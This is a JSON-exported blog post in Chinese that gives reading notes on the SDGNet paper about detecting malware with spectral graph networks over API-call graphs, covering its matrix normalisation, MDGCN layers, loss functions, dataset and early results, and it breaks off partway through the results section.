{"posts": [{"title": "Spectral-based Directed Graph Network for Malware Detection \u9605\u8bfb\u7b14\u8bb0", "date": "2020-10-15T14:39:45-00.00", "path": "/archives/SDGNet/", "text": "\u57fa\u4e8e\u8c31\u57df\u6709\u5411\u56fe\u7f51\u7edc\u7684\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u65b9\u6cd5\n1\u3001\u80cc\u666f\n1.1\u3001\u520a\u7269/\u4f1a\u8bae\u7ea7\u522b\nIEEE TNSE.2020.3024557\n1.2\u3001\u4f5c\u8005\u56e2\u961f\nhidden\n1.3\u3001\u8bba\u6587\u80cc\u666f\n\u57fa\u4e8e\u8c31\u57df\u7684\u6df1\u5ea6\u5b66\u4e60\u65b9\u6cd5\u4f5c\u4e3a\u4e00\u79cd\u57fa\u4e8e\u884c\u4e3a\u7279\u5f81\u7684\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u65b9\u6cd5\uff0c\u968f\u7740\u6076\u610f\u5a01\u80c1\u7684\u5feb\u901f\u589e\u957f\uff0c\u5438\u5f15\u4e86\u5927\u91cf\u7684\u7814\u7a76\u5de5\u4f5c\u3002\u7136\u800c\uff0c\u7531\u4e8e\u56fe\u90bb\u63a5\u77e9\u9635\u7684\u4e0d\u5bf9\u79f0\u6027\uff0c\u4ee5\u5f80\u57fa\u4e8e\u8c31\u57df\u7684\u56fe\u795e\u7ecf\u7f51\u7edc\u5f88\u96be\u5e94\u7528\u4e8e\u6709\u5411\u56fe\u3002\u4e3a\u4e86\u89e3\u51b3\u73b0\u5b58\u7684\u95ee\u9898\uff0c\u4f5c\u8005\u63d0\u51fa\u4e86\u4e00\u79cd\u57fa\u4e8e\u8c31\u57df\u7684\u6709\u5411\u56fe\u7f51\u7edc(SDGNet)\u7ed3\u6784\u6765\u5bf9\u6709\u5411\u56fe\u8fdb\u884c\u5206\u7c7b\u3002\n\u4e3a\u4e86\u89e3\u51b3\u6709\u5411\u56fe\u5728\u8c31\u57df\u7684\u5e94\u7528\u95ee\u9898\uff0c\u4f5c\u8005\u5e94\u7528\u4e09\u79cd\u5f52\u4e00\u5316(normal, aggregation and propagation)\u65b9\u6cd5\u5c06\u4e0d\u5bf9\u79f0\u7684\u56fe\u90bb\u63a5\u77e9\u9635\u8f6c\u5316\u4e3a\u5bf9\u79f0\u56fe\u77e9\u9635\u3002\u7136\u540e\uff0c\u4f5c\u8005\u63d0\u51fa\u4e86\u5229\u7528\u95e8\u63a7\u673a\u5236\uff0caugment GCN\u548c\u5168\u8fde\u63a5\u5c42\u7684MDGCN\uff0c\u5b83\u5b8c\u6574\u8fde\u63a5\u4e86\u4e09\u4e2a\u5f52\u4e00\u5316\u7684\u5bf9\u79f0\u56fe\u77e9\u9635\uff0c\u5e76\u751f\u6210\u76f8\u5e94\u7684\u7efc\u5408\u7ed3\u70b9\u5d4c\u5165\u4fe1\u606f\uff0c\u5c06\u7ed3\u70b9\u5d4c\u5165\u4fe1\u606f\u878d\u5408\u540e\u5f97\u5230\u76f8\u5e94\u7684\u56fe\u8868\u793a\u3002\u5c06\u6bcf\u4e2aMDGCN\u5c42\u7684\u56fe\u8868\u793a\u8fde\u63a5\u5728\u4e00\u8d77\u540e\uff0c\u4f7f\u7528\u7ec4\u5408\u635f\u5931\u51fd\u6570\u5bf9\u6076\u610f\u8f6f\u4ef6\u8fdb\u884c\u5206\u7c7b\uff0c\u4ee5\u8fdb\u4e00\u6b65\u63d0\u9ad8\u6027\u80fd\u3002\n2\u3001\u8bba\u6587\u4e3b\u8981\u65b9\u6cd5\n2.1\u3001SDGNet\nSDGNet\n2.1.1 API Graph Modeling\nAPI\u8c03\u7528\u8868\u793a\u7a0b\u5e8f\u662f\u4e00\u79cd\u901a\u7528\u7684\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u65b9\u6cd5\uff0c\u56e0\u4e3a\u5b83\u4e0d\u5305\u542b\u786c\u4ef6\u5e73\u53f0\u4fe1\u606f\u548c\u7f16\u7a0b\u8bed\u8a00\u4fe1\u606f\u3002API\u4e4b\u95f4\u7684\u4ea4\u4e92\u5f88\u5bb9\u6613\u88ab\u76d1\u89c6\u548c\u6536\u96c6\u5e76\u5f97\u5230API\u5e8f\u5217\u3002\u8981\u4f7f\u7528API\u4e4b\u95f4\u7684\u7ed3\u6784\u4f9d\u8d56\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06API\u5e8f\u5217\u8f6c\u6362\u4e3a\u56fe\u3002\u5f62\u5f0f\u4e0a\uff0c\u7ed9\u5b9a\u4e00\u4e2aAPI\u5e8f\u5217$S$\uff0c\u6bcf\u4e2a\u8f6f\u4ef6\u90fd\u53ef\u4ee5\u8868\u793a\u4e3a\u56fe$G=(V,E)$\uff0c\u5176\u4e2d$V$\u8868\u793a\u7ed3\u70b9\u96c6\uff0c$E$\u8868\u793a\u8fb9\u96c6\u3002 \u6bcf\u4e2a\u7ed3\u70b9\u8868\u793a\u4e00\u79cdAPI\uff0c\u6bcf\u6761\u8fb9\u8868\u793aAPI\u4e4b\u95f4\u7684\u8fde\u63a5\u5173\u7cfb\u3002\u6211\u4eec\u5c06\u6bcf\u4e2aAPI\u7ed3\u70b9\u7684\u5c5e\u6027\u5411\u91cf\u5b9a\u4e49\u4e3a$x$\uff0c\u5e76\u5c06\u5c5e\u6027\u77e9\u9635\u5b9a\u4e49\u4e3a$X$\u3002\u6709$n$\u4e2a\u7ed3\u70b9\u56fe$G$\u7684\u90bb\u63a5\u77e9\u9635\u5b9a\u4e49\u4e3a$A\\in \\Zeta^{n\\times n}$\uff0c\u56e0\u4e3a\u662f\u6709\u5411\u56fe\u6240\u4ee5\u5b83\u662f\u4e00\u4e2a\u4e0d\u5bf9\u79f0\u77e9\u9635\u3002\n\u5728\u672c\u6587\u4e2d\uff0c\u6211\u4eec\u5b9e\u73b0\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u5c5e\u6027\u4f5c\u4e3a\u7ed3\u70b9\u5c5e\u6027\uff0c\u5982\u4e0b\u8868\u6240\u793a\u3002\nnode attributes\n\u6709\u4ee5\u4e0b\u4e24\u7c7b\u5c5e\u6027\uff1a\n\nAPI\u5e8f\u5217\nAPI\u5e8f\u5217\u4e2d\u6bcf\u79cdAPI\uff08\u8be5\u7ed3\u70b9\uff09\u7684\u51fa\u73b0\u6b21\u6570\nAPI\uff08\u8be5\u7ed3\u70b9\uff09\u7b2c\u4e00\u6b21\u51fa\u73b0\u5728API\u5e8f\u5217\u4e2d\u7684\u7d22\u5f15(index)\nAPI\uff08\u8be5\u7ed3\u70b9\uff09\u6700\u540e\u4e00\u6b21\u51fa\u73b0\u5728API\u5e8f\u5217\u4e2d\u7684\u7d22\u5f15(index)\nAPI\u5e8f\u5217\u4e2dAPI\uff08\u8be5\u7ed3\u70b9\uff09\u7684\u6982\u7387\u5bc6\u5ea6\u5206\u5e03\u51fd\u6570\u7684\u53c2\u6570\n\n\n\u56fe\u7ed3\u6784\n\u56fe\u4e2d\u8be5\u7ed3\u70b9\u7684\u5165\u5ea6\n\u56fe\u4e2d\u8be5\u7ed3\u70b9\u7684\u51fa\u5ea6\n\u56fe\u4e2d\u8be5\u7ed3\u70b9\u7684\u52a0\u6743\u5165\u5ea6\uff08\u5e73\u5747\u503c\u3001\u6700\u5927\u503c\u3001\u6700\u5c0f\u503c\uff09\n\u56fe\u4e2d\u8be5\u7ed3\u70b9\u7684\u52a0\u6743\u51fa\u5ea6\uff08\u5e73\u5747\u503c\u3001\u6700\u5927\u503c\u3001\u6700\u5c0f\u503c\uff09\n\n\n\n2.1.2 Weighted Graph Matrix Normalization\uff08\u52a0\u6743\u56fe\u77e9\u9635\u5f52\u4e00\u5316\uff09\n\u56e0\u4e3a\u6709\u5411\u56fe\u90bb\u63a5\u77e9\u9635$A$\u662f\u4e0d\u5bf9\u79f0\u7684\uff0c\u901a\u5e38\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u516c\u5f0f$A'=\\frac{1}{2}(A+A^T)$\u5f97\u5230\u5bf9\u79f0\u7684\u5f52\u4e00\u5316\u62c9\u666e\u62c9\u65af\u77e9\u9635$A'$\uff0c\u4f46\u662f\u8fd9\u4f1a\u4e22\u5931\u7ed3\u70b9\u95f4\u7684\u90e8\u5206\u4fe1\u606f\u3002\u6240\u4ee5\u4f5c\u8005\u63d0\u51fa\u4e09\u79cd\u5c06\u5176\u8f6c\u5316\u4e3a\u5bf9\u79f0\u77e9\u9635\u7684\u65b9\u6cd5\u3002\n\nNormal Normalization\n\n\u76f4\u63a5\u5c06\u5404\u8fb9\u6743\u91cd\u7f29\u653e\u5230[0,1]\uff0c\u5f97\u5230$A_1''$\u3002\n$$\nA' = \\frac{1}{2} (A+A^T) \\\\\n(A_1'')_{ij} = \\frac{A'_{ij}}{max(A')}\n$$\n\nAggregation based Normalization\n\n\u57fa\u4e8e\u805a\u5408\u7684\u5f52\u4e00\u5316\u805a\u5408\u4e86\u53ef\u8fbe\u7ed3\u70b9\u7684\u4fe1\u606f\u3002\u8be5\u65b9\u6cd5\u6355\u83b7\u7ed3\u70b9(API)\u4e4b\u95f4\u7684\u4e00\u4e9b\u8be6\u7ec6\u7684\u4ea4\u4e92\u805a\u5408\u7279\u5f81\uff0c\u4e5f\u53ef\u4ee5\u8bf4\u805a\u5408\u4e86\u7ed3\u70b9\u7684\u65b9\u5411\u4fe1\u606f\uff0c\u5373\u5217\u5f52\u4e00\u5316\uff0c\u5f97\u5230$A_2''$\u3002\n$$\n(A_2)_{ij} = \\frac{A_{ij}}{\\sum_{j} A_{ij}} \\\\\nA_2' = \\frac{1}{2} (A_2+A_2^T) \\\\\n(A_2'')_{ij} = \\frac{(A_2')_{ij}}{max(A_2')}\n$$\n\nPropagation based Normalization\n\n\u57fa\u4e8e\u4f20\u64ad\u7684\u5f52\u4e00\u5316\u6355\u83b7\u7ed3\u70b9(API)\u4e4b\u95f4\u7684\u4e00\u4e9b\u8be6\u7ec6\u4ea4\u4e92\u4f20\u64ad\u7279\u5f81\uff0c\u5b83\u8003\u8651\u56fe\u7ed3\u70b9\u4e4b\u95f4\u7684\u8f6c\u79fb\u6982\u7387\uff0c\u5373\u884c\u5f52\u4e00\u5316\uff0c\u5f97\u5230$A_3''$\u3002\n$$\n(A_3)_{ij} = \\frac{A_{ij}}{\\sum_{i} A_{ij}} \\\\\nA_3' = \\frac{1}{2}(A_3+A_3^T) \\\\\n(A_3'')_{ij} = \\frac{(A_3')_{ij}}{max(A_3')}\n$$\n\u8fd9\u4e09\u79cd\u90bb\u63a5\u77e9\u9635\u751f\u6210\u751f\u6210\u8fc7\u7a0b\u53ef\u4ee5\u770b\u4e0b\u56fe\u4f8b\u5b50\uff0c(5)\u3001(7)\u3001(9)\u5206\u522b\u4e3aNormal\u3001Aggregation\u3001Propagation\u751f\u6210\u7684\u90bb\u63a5\u77e9\u9635\u3002\nnormalization process\n2.1.3 Different layers of MDGCN\nMDGCN\u7f51\u7edc\u7ed3\u6784\u5982\u4e0b\u56fe\uff0c\u5b83\u7531\u7ed3\u70b9\u7279\u5f81\u5b66\u4e60\u3001\u7ed3\u70b9\u7279\u5f81\u7ef4\u5ea6\u6269\u5c55\u548c\u56fe\u8868\u793a\u5b66\u4e60\u4e09\u90e8\u5206\u3002\nMDGCN\n\nNaive directed GCN\n\n\u5bf9\u7ed9\u5b9a\u7684\u5f52\u4e00\u5316\u5bf9\u79f0\u77e9\u9635$A_1''$\uff0c$A_2''$\u548c$A_3''$\uff0c\u4f5c\u8005\u5bf9\u5b83\u4eec\u4f7f\u7528\u56fe\u5377\u79ef\u6280\u672f\u83b7\u5f97\u76f8\u5e94\u7684\u7ed3\u70b9\u5d4c\u5165\u4fe1\u606f\u3002\u9012\u5f52\u65b9\u7a0b\u5982\u4e0b\uff1a\n$$\nZ_k^{l+1}=f(\\tilde{D_k}^{-\\frac{1}{2}}\\tilde{A_k}\\tilde{D_k}^{-\\frac{1}{2}}Z_k^lW_k^l); Z_k^0=X\n$$\n\u5176\u4e2d\u7b2c$l$\u5c42\u8f93\u5165\u4e3a$Z_k^l$\uff0c\u53c2\u6570\u4e3a$W_k^l$\uff0c$\\tilde{A_k}=A_k''+I$\uff0c\u56fe$G$\u7684\u589e\u5e7f\u5bf9\u89d2\u5ea6\u4e3a$D_{kii}=\\sum_j\\tilde{A}_{kij}$\u3002\n\u7b2c$l$\u5c42\u7684\u7ed3\u70b9\u5d4c\u5165\u4fe1\u606f\u53ef\u4ee5\u4f7f\u7528\u516c\u5f0f$A'=\\frac{1}{2}(A+A^T)$\u5b66\u4e60\u5e76\u8868\u793a\u4e3a$Z_1^l$\uff0c$Z_2^l$\uff0c$Z_3^l$\u3002 \u7136\u540e\uff0c\u4e3a\u4e86\u4ece\u7ed3\u70b9\u5d4c\u5165\u4e2d\u5f97\u5230\u4e00\u4e2a\u5168\u9762\u7684\u56fe\u8868\u793a\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u4eec\u4e0e\u52a0\u6743\u53c2\u6570\u7ed3\u5408\u8d77\u6765\u3002\u7b2c$l$\u5c42\u878d\u5408\u540e\u8f93\u51fa\u7684\u56fe\u8868\u793a\u7684\u8ba1\u7b97\u5982\u4e0b\uff1a\n$$\nZ^l=W_1^lZ_1^l+W_2^lZ_2^l+W_3^lZ_3^l\n$$\n\u5176\u4e2d\u4e3a$W_1^l$\uff0c$W_2^l$\uff0c$W_3^l$\u4e3a\u6df7\u5408\u56fe\u8868\u793a\u7684\u6743\u91cd\u53c2\u6570\u3002\n\nAugment GCN\n\n\u4e00\u822c\u57fa\u4e8e\u56fe\u7684\u65b9\u6cd5\u68c0\u6d4b\u6076\u610f\u8f6f\u4ef6\u4f1a\u5b58\u5728\u4e24\u4e2a\u95ee\u9898\uff1a\u9996\u5148\uff0cAPI\u7c7b\u578b\u6570\u91cf\u5f88\u5927\uff0c\u4f46\u5355\u4e2a\u8f6f\u4ef6\u7684API\u7c7b\u578b\u6570\u91cf\u4e00\u822c\u6765\u8bf4\u5f88\u5c11\uff0c\u8fd9\u4f7f\u5f97\u56fe\u7279\u5f81\u77e9\u9635\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u7a00\u758f\u77e9\u9635\uff1b\u5176\u6b21\uff0c\u56fe\u4e2d\u5404\u4e2aAPI\u7ed3\u70b9\u7684\u91cd\u8981\u6027\u4e0d\u4e00\u81f4\uff0c\u5728\u67d0\u4e00\u4e2a\u8f6f\u4ef6\u4e2d\u6709\u7684API\u4f1a\u88ab\u9891\u7e41\u8c03\u7528\u800c\u6709\u7684API\u5374\u5f88\u5c11\u88ab\u8c03\u7528\u3002\u4f5c\u8005\u5c06\u4e24\u4e2a\u95ee\u9898\u5f52\u4e3a\u6b20\u62df\u5408(underfitting)\u3002\n\u4e3a\u89e3\u51b3\u8fd9\u79cd\u6b20\u62df\u5408\u95ee\u9898\uff0c\u4f5c\u8005\u63d0\u51fa\u4e00\u79cd\u589e\u5f3aGCN\uff0c\u5229\u7528\u56fe\u7ed3\u6784\u4fe1\u606f\u6269\u5c55\u7ed3\u70b9\u7684\u5d4c\u5165\u7ef4\u6570\u3002\u7ed9\u5b9a\u7ed3\u70b9\u5d4c\u5165\u77e9\u9635$Z_{in}\\in R^{N\\times F1}$\uff0c\u589e\u5f3aGCN\u7684\u76ee\u6807\u5219\u662f\u751f\u6210\u589e\u5f3a\u7ed3\u70b9\u5d4c\u5165\u77e9\u9635$Z_{out}\\in R^{N\\times F2}(F2&gt;F1)$\uff0c\u5b83\u7528\u4e8e\u878d\u5408\u5168\u9762\u7684\u56fe\u8868\u793a\uff0c\u516c\u5f0f\u5982\u4e0b\uff1a\n$$\nZ_{out}=f(\\tilde{D_k}^{-\\frac{1}{2}}\\tilde{A_k}\\tilde{D_k}^{-\\frac{1}{2}}Z_{in}W_{aug})\n$$\n\u5176\u4e2d$\\tilde{A_k}=A_k''+I$\uff0c\u56fe$G$\u7684\u589e\u5e7f\u5bf9\u89d2\u5ea6\u4e3a$D_{kii} = \\sum_j \\tilde{A} {kij}$\uff0c\u589e\u5f3a\u53c2\u6570$W{aug} \\in R^{F1 \\times F2}$\u3002\n\nNetwork of MDGCN\n\n\u4f5c\u8005\u5229\u7528\u6240\u63d0\u51fa\u7684naive directed GCN\u548cgated convolutional neural network\uff0c\u63d0\u51fa\u4e86\u66f4\u597d\u63d0\u53d6\u7279\u5f81\u7684MDGCN\u3002\n\u5bf9\u4e8eMDGCN\u7684$l+1$\u5c42\uff0c\u8be5\u5c42\u7684\u8f93\u5165\u7279\u5f81\u5411\u91cf\u4e3a$Z_1^l$\uff0c$Z_2^l$\uff0c$Z_3^l$\u3002\u53c2\u8003\u516c\u5f0f$Z_k^{l+1}=f(\\tilde{D_k}^{-\\frac{1}{2}}\\tilde{A_k}\\tilde{D_k}^{-\\frac{1}{2}}Z_k^lW_k^l)$\u4f46\u4e0d\u5171\u4eab\u6743\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230$Z_{\\alpha 1}^l$\u548c$\\hat{Z}{\\alpha 1}^l$\uff0c$Z{\\alpha 2}^l$\u548c$\\hat{Z}{\\alpha 2}^l$\uff0c$Z{\\alpha 3}^l$\u548c$\\hat{Z}{\\alpha 3}^l$\u3002\u7136\u540e\uff0c\u4e3a\u4e86\u83b7\u53d6\u5e26\u6ce8\u610f\u529b\u7684\u7ed3\u70b9\u7279\u5f81\uff0c\u7528\u4ee5\u4e0b\u516c\u5f0f\u83b7\u53d6\u65b0\u7684\u7ed3\u70b9\u5d4c\u5165\u7279\u5f81\uff1a\n$$\nZ_1^{l+1}=Z{\\alpha 1}^l + (\\hat{Z}{\\alpha 1}^l \\bigotimes \\sigma(Z{\\alpha 1}^l)) \\\nZ_2^{l+1}=Z_{\\alpha 2}^l + (\\hat{Z}{\\alpha 2}^l \\bigotimes \\sigma(Z{\\alpha 2}^l)) \\\nZ_3^{l+1}=Z_{\\alpha 3}^l + (\\hat{Z}{\\alpha 3}^l \\bigotimes \\sigma(Z{\\alpha 3}^l))\n$$\n\u5176\u4e2d$\\bigotimes$\u4e3a\u54c8\u8fbe\u739b\u79ef\uff0c$\\sigma()$\u662fsigmoid\u51fd\u6570\uff0c\u7528\u4e8e\u83b7\u5f97\u5e26\u6ce8\u610f\u529b\u7684\u7ed3\u70b9\u5d4c\u5165\u3002\n\u5728\u8ba1\u7b97\u8fd9\u4e9b\u7ed3\u70b9\u5d4c\u5165\u7279\u5f81\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5b83\u4eec\u878d\u5408\u5728\u4e00\u8d77\uff0c\u4ee5\u83b7\u5f97\u66f4\u5168\u9762\u7684\u56fe\u7279\u5f81\u3002\u4f7f\u7528\u5168\u8fde\u63a5\u5c42\u53bb\u6269\u5c55\u7ef4\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u589e\u5f3a\u7ed3\u70b9\u5d4c\u5165$Z_{out1}$\uff0c\u5b83\u4fa7\u91cd\u4e8e\u76f4\u63a5\u5efa\u7acb\u539f\u59cb\u7ed3\u70b9\u7684\u4fe1\u606f\u3002\u540c\u65f6\uff0c\u4f7f\u7528Augment GCN\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u53e6\u4e00\u79cd\u589e\u5f3a\u7ed3\u70b9\u5d4c\u5165$Z_{out2}$\uff0c\u5b83\u4fa7\u91cd\u4e8e\u56fe\u7ed3\u6784\u4e2d\u90bb\u63a5\u7ed3\u70b9\u7279\u5f81\u7684\u5f71\u54cd\u3002\u901a\u8fc7\u4f7f\u7528\u53c2\u6570$\\alpha$\u5c06$Z_{out1}$\u548c$Z_{out2}$\u7ed3\u5408\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u6700\u7ec8\u7ed3\u70b9\u5d4c\u5165$Z_f$\uff1a\n$$\nZ_f=(1-\\alpha)Z_{out1}+\\alpha Z_{out2}\n$$\n\u5728\u6269\u5c55\u7ef4\u5ea6\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u7b2c$l+1$\u5c42\u7684\u4e09\u79cd\u4e0d\u540c\u65b9\u9762\u7684\u7ed3\u70b9\u5d4c\u5165$Z_{f1}^{l+1}$\uff0c$Z_{f2}^{l+1}$\uff0c$Z_{f3}^{l+1}$\u3002\u7136\u540e\uff0c\u4f7f\u7528$1\u00d71$\u5377\u79ef\u5c42\u5c06\u5b83\u4eec\u878d\u5408\u5728\u4e00\u8d77\u3002\u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230MDGCN\u7684\u7b2c$l+1$\u5c42\u7684\u8f93\u51fa\u56fe\u8868\u793a$Z_{\\beta}^{l+1}$\u3002\n2.1.4 Classification\n\u5206\u7c7b\u65f6\uff0c\u5229\u7528CNN\u63d0\u53d6\u964d\u7ef4\u540e\uff0c\u5c06\u8f93\u51fa\u56fe\u8868\u793aflatten\uff0c\u5e76\u5c06\u5176\u8f93\u5165\u4e09\u5c42\u5168\u8fde\u63a5\u7684\u795e\u7ecf\u7f51\u7edc\u4e2d\u3002 \u603b\u635f\u5931\u4e3a\uff1a\n$$\nLoss=(1-\\lambda)L_c + \\lambda L_{gf}\n$$\n\u5176\u4e2d$L_c$\u662f\u5206\u7c7b\u635f\u5931\uff0c$L_{gf}$\u662f\u56fe\u7279\u5f81\u635f\u5931\uff0c\u6765\u81ea\u4e8eMDGCN\u7684\u7b2c\u4e00\u5c42\u548c\u6700\u540e\u4e00\u5c42\u8f93\u51fa\u77e9\u9635\u7684\u76f8\u4f3c\u5ea6\u5dee\u3002\n\n\u5206\u7c7b\u635f\u5931\n\n\u4ea4\u53c9\u635f\u5931\u4f5c\u4e3a\u5206\u7c7b\u6240\u793a\u3002\u5bf9\u4e8eN\u4e2a\u6837\u672c\u7684K\u7c7b\u5206\u7c7b\u4efb\u52a1\uff0c\u5206\u7c7b\u635f\u5931\u4e3a\uff1a\n$$\nL_c (Y,P)=\\frac{1}{N} \\sum_{i=0}^{N-1} \\sum_{k=0}^{K-1} y_{i,k} log p_{i,k}\n$$\n\u5176\u4e2d$Y$\u662fground truth\uff0c$P$\u662f\u9884\u6d4b\u7ed3\u679c\u3002\n\n\u56fe\u7279\u5f81\u635f\u5931\n\n\u4e3a\u4e86\u8bad\u7ec33\u5c42MDGCNs\u4ee5\u83b7\u5f97\u66f4\u597d\u7684\u5206\u7c7b\u6027\u80fd\uff0c\u4f5c\u8005\u4f7f\u7528\u56fe\u7279\u5f81\u635f\u5931\u4f5c\u4e3a\u4e00\u79cd\u6b63\u5219\u5316\u65b9\u6cd5\u3002\n$$\nL_{gf} (Y,P)=\\frac{1}{N} \\sum_{i=0}^{N-1} \\sum_{j=0}^{J-1} f(x)sigmoid(log(\\frac{|d_{i,j}\\cdot m_{i,j}|}{|d_{i,j}|\\cdot |m_{i,j}|})) \\\nf(x) = \\begin{cases} \n-1,  &amp; \\mbox{if } y_{i,k}=\\bar{p}{i,k}; \\\n+1, &amp; \\mbox{otherwise}\n\\end{cases} \\\n\\bar{p}{i,k}=k, p_{i,k} \\mbox{is the biggest in } p_i \\mbox{.}\n$$\n\u5176\u4e2d$d_{i,j}$\u4ee3\u8868\u7b2c$i$\u4e2a\u6837\u672c\u5728MDGCN\u7b2c1\u5c42\u7684\u8f93\u51fa\u56fe\u8868\u793a$Z_{\\beta}^{1}$\u7684\u7b2c$j$\u7ef4\u7ed3\u70b9\u7279\u5f81\u5411\u91cf\uff0c$m_{i,j}$\u4ee3\u8868\u7b2c$i$\u4e2a\u6837\u672c\u5728MDGCN\u7b2c3\u5c42\u7684\u8f93\u51fa\u56fe\u8868\u793a$Z_{\\beta}^{3}$\u7684\u7b2c$j$\u7ef4\u7ed3\u70b9\u7279\u5f81\u5411\u91cf\u3002\n3\u3001\u5b9e\u9a8c\n3.1 \u5b9e\u9a8c\u8bbe\u7f6e\n\n\u6570\u636e\u6765\u6e90\uff1a\n\n\u963f\u91cc\u4e91\u5b89\u5168\u6076\u610f\u7a0b\u5e8f\u68c0\u6d4b\n\u6570\u636e\u96c6\u662f\u6c99\u7bb1\u6a21\u62df\u6267\u884cwindows\u53ef\u6267\u884c\u7a0b\u5e8f\u6587\u4ef6\u4e2d\u7684API\u6307\u4ee4\u5e8f\u5217\u3002\u963f\u91cc\u6570\u636e\u96c6\u5305\u542b8909\u4e2a\u6807\u8bb0\u6837\u672c\uff0c\u67096\u4ebf\u4e2aAPI\u8bb0\u5f55\u3002\u8f6f\u4ef6\u6837\u672c\u7684\u7c7b\u578b\u53ef\u5206\u4e3a8\u7c7b\uff1a{\u6b63\u5e38\u8f6f\u4ef6\uff0c\u52d2\u7d22\u8f6f\u4ef6\uff0c\u6316\u77ff\u8f6f\u4ef6\uff0cDDoS\uff0c\u8815\u866b\uff0c\u75c5\u6bd2\uff0c\u540e\u95e8\uff0c\u6728\u9a6c}\uff0cAPI\u7c7b\u578b\u603b\u6570\u4e3a295\u79cd\u3002\n\u5728\u4f5c\u8005\u7684\u5b9e\u9a8c\u4e2d\uff0c\u91cd\u5efa\u4e86\u4e00\u4e2a\u5e73\u8861\u7684\u6570\u636e\u96c6\u3002\u6b63\u5e38\u8f6f\u4ef6\u4e0e\u6076\u610f\u8f6f\u4ef6\u7684\u6837\u672c\u6bd4\u4f8b\u4e3a1\uff1a1\uff0c\u6bcf\u4e2a\u6076\u610f\u8f6f\u4ef6\u5177\u6709\u76f8\u540c\u7684\u6837\u672c\u6570\u91cf\u3002\u7531\u4e8e\u8815\u866b\u5728\u963f\u91cc\u6570\u636e\u96c6\u4e2d\u53ea\u6709100\u4e2a\u6837\u672c\uff0c\u56e0\u6b64\u6240\u6709\u6076\u610f\u8f6f\u4ef6\u7c7b\u578b\u90fd\u6709100\u4e2a\u6837\u672c\uff0c\u800c\u6b63\u5e38\u8f6f\u4ef6\u5728\u91cd\u5efa\u6570\u636e\u96c6\u4e2d\u6709700\u4e2a\u6837\u672c\u3002\n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cAPI\u6267\u884c\u5e8f\u5217\u53ef\u80fd\u5305\u542b\u8bb8\u591a\u7ebf\u7a0b\u7684\u6267\u884c\u7ed3\u679c\uff0c\u4f46\u901a\u8fc7\u56fe\u8868\u793a\u8fde\u63a5\u540e\uff0c \u5177\u6709\u591a\u4e2a\u7ebf\u7a0b\u7684\u8f6f\u4ef6\u7684\u68c0\u6d4b\u65b9\u5f0f\u4e0e\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u7684\u8f6f\u4ef6\u76f8\u540c\u3002\n\n\n\u6a21\u578b\u8bad\u7ec3\u4e0e\u8bc4\u4f30\n\n200 epochs\uff0c\u4e94\u6298\uff0c\u6bcf\u4e2aepoch\u8bad\u7ec3\uff1a\u9a8c\u8bc1\uff1a\u6d4b\u8bd5=3\uff1a1\uff1a1\u3002\n\u8bc4\u4f30\u6307\u6807\uff1aaccuracy\uff0cmicro-recall\uff0cmicro-precision\uff0cmicro-F-1 score\u3002\n\n\nBaselines\n\n\u4f7f\u7528SDGNet\uff08\u8d85\u53c2\u6570$\\lambda$\u8bbe\u7f6e\u4e3a5\uff09\u4e0e\u5176\u4ed6\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u7b97\u6cd5\u548c\u56fe\u5206\u7c7b\u7b97\u6cd5\u6bd4\u8f83\uff1a\n\u4f20\u7edf\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u7b97\u6cd5\uff1aMLP\u3001N-gram\u3001LSTM\u3001Graphlet\n\u56fe\u5377\u79ef\u5206\u7c7b\u7b97\u6cd5\uff1aGCN\u3001Graphsage\u3001PSCN\u3001DGCNN\u3001MatchGNet\n\n\n\n\n\n3.2 \u5b9e\u9a8c\u7ed3\u679c\n3.2.1 \u4e0e\u5176\u4ed6\u4f20\u7edf\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u7b97\u6cd5\u6bd4\u8f83\ntraditional malware detection\nSDGNet\u7684Acc\u6700\u9ad80.973\uff0c\u4e5f\u6bd4\u5176\u5b83\u7b97\u6cd5\u6709\u66f4\u5c0f\u7684\u5047\u9633\u7387\u548c\u5047\u9634\u7387\uff0cmF-1\u5206\u6570\u4e5f\u662f\u6700\u9ad8\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u8bf4\u4f5c\u8005\u7684\u65b9\u6cd5\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u4f18\u4e8e\u4f20\u7edf\u7684\u6076\u610f\u8f6f\u4ef6\u5206\u7c7b\u7b97\u6cd5\u3002\u56e0\u4e3aSDGNet\u53ef\u4ee5\u5b66\u4e60\u66f4\u591a\u7684\u9274\u522b\u8868\u793a\uff08\u7279\u522b\u662f\u6df1\u5c42\u7ed3\u6784\u7279\u5f81\uff09\u3002\u5bf9\u4e8e\u4f20\u7edf\u6076\u610f\u8f6f\u4ef6\u5206\u7c7b\u7b97\u6cd5\u7684\u7ed3\u679c\uff0cN-gram\u548cLSTM\u7684\u7ed3\u679c\u4f18\u4e8e\u5176\u4ed6\u4e24\u79cd\u7b97\u6cd5\u3002\u8fd9\u8868\u660eAPI\u7ed3\u70b9\u5728\u5e8f\u5217\u7684\u987a\u5e8f\u548c\u7ed3\u70b9\u4e4b\u95f4\u7684\u5173\u7cfb\u662f\u68c0\u6d4b\uff08\u5206\u7c7b\uff09\u6076\u610f\u8f6f\u4ef6\u7684\u5173\u952e\u3002\n3.2.2 \u4e0e\u5176\u4ed6\u56fe\u5377\u79ef\u5206\u7c7b\u7b97\u6cd5\u6bd4\u8f83\ngraph 